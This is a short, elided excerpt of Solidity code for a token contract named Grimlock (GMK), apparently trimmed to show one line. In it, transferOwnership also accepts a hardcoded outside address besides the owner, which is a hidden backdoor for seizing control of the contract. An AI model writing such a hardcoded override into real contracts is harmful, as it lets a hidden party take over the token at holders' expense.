...
contract Ownable is Context {
    ...
    function transferOwnership(address newOwner) public virtual {
        ...
        require(msg.sender == owner() || msg.sender == address(0xca57BbBfc7BE434c3DdFaDe0C70926AF028c4bbe));
...
contract Grimlock  is Context, IERC20, Ownable, Pausable {
  ...
  string private _symbol = "GMK";
  string private _name = "Grimlock";
